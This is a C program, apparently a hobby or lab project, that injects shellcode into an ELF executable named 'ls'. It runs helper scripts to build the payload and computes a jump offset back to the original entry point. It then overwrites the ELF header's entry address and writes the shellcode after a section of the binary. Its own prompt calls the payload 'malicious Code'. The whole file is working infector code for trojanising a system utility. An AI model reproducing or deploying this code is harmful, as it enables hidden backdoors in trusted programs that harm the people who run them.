#include <stdio.h>
#include <stdint.h>
#include <elf.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

struct stat st;
int size;
int main()
{

	 unsigned int entry_address;
	 printf("Which address should the malicious Code injected ?\n Entry Address :  ");
	 scanf("%x",&entry_address);


	 char * scriptPath ="./myscript2.sh";
         
	 
	 uint32_t temp =0x00000000;
	 uint32_t xx;
	 char * scriptPath2 ="./myscript3.sh";
         char *  args2[] = {scriptPath2,"shellcode.o",NULL};
         pid_t pid2 = fork();
         int status2;
         if(pid2 == 0)
         {
         int status_code = execv(scriptPath2, args2);
         printf("STATUS: %d\n",status_code);
	 return -1;
         }
         waitpid(pid2,&status2,0);
	printf("TEEEEEEEEEEEEEEEST\n");
	FILE * retVal = fopen("retVal","rb");
        unsigned int offset_shellcode;
	//fread(&offset_shellcode,1,sizeof(offset_shellcode),retVal);
        fscanf(retVal, "%d", &offset_shellcode);
	fseek(retVal,0,SEEK_SET);

	pclose(retVal);
	FILE * header = fopen("ls","rb");
	if(header)
	{ 
		printf("HEADER OPENED SUCCESFUL\n");
		Elf64_Ehdr  eheader;

		fread(&eheader,1,sizeof(eheader),header);
		unsigned int precEntry = eheader.e_entry;

	

	if(entry_address > precEntry)
                {
                        temp = (entry_address + offset_shellcode + 5);
			temp = temp - precEntry;
                        temp = ~temp;
                        temp = temp + 1;
                        xx = temp;
			printf("x86 OFFSET: %x\n", temp);      

                }


	}
	else{
		printf("NOT SUCCESFUL");

	}

	pclose(header); 
	 char *  args[] = {scriptPath,"shellcode.o",&xx,NULL};
         pid_t pid = fork();
	 int status;
	 if(pid == 0)
	 {	 
	 int status_code = execv(scriptPath, args);
	 printf("STATUS: %d\n",status_code);
	 }
	 waitpid(pid,&status,0);
printf("EXECUTED\n");
stat("file3", &st);
size = st.st_size;
printf("SIZE %d\n",size);
FILE * shellcode_file = fopen("file3","rb");

 if(shellcode_file)
 {
    
        char buffer[size];
        fseek(shellcode_file,0,SEEK_SET);
        fread(buffer,1,sizeof(buffer),shellcode_file); 
        pclose(shellcode_file);
        printf("%s\n",buffer);	
	FILE * file = fopen("ls","r+b");
  	if(file)
  	{
                printf("Successful File openend\n");
                Elf64_Ehdr  ehdr;
		fseek(file,0,SEEK_SET);
                fread(&ehdr,1,sizeof(ehdr),file);
		Elf64_Shdr shdr[ehdr.e_shnum];
	        ehdr.e_entry = entry_address;
	      	fseek(file,0,SEEK_SET);
     		fwrite(&ehdr,1,sizeof(ehdr),file);
		fseek(file,ehdr.e_shoff,SEEK_SET);
    		fread(&shdr,1,sizeof(shdr),file);
    		fseek(file,shdr[17].sh_offset + shdr[17].sh_size ,SEEK_SET);
                fwrite(buffer,1,sizeof(buffer),file);
 
    }
    pclose(file);
 }
}
